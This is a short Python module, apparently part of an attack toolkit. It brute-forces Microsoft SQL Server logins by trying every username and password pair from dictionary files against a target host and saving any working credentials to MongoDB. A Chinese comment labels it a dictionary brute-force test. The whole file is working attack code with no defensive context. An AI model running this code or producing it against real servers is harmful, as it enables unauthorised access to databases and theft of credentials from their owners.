#coding:utf-8

import pymssql

def mssql_attack(host, port, mongo):
    _info = dict(
        name="mssql",
        ip=host,
        port=port,
        username="",
        password=""
    )

    # 字典爆破测试
    for username in open("dict/ssh_user.dic", "r"):
        for password in open("dict/ssh_pass.dic", "r"):
            _username = username.strip()
            _password = password.strip()
            try:
                conn=pymssql.connect(host=host,user=_username,password=_password,database="*")
                _info["username"] = _username
                _info["password"] = _password
                mongo.insert(_info)
                conn.close()
                break
            except:
                pass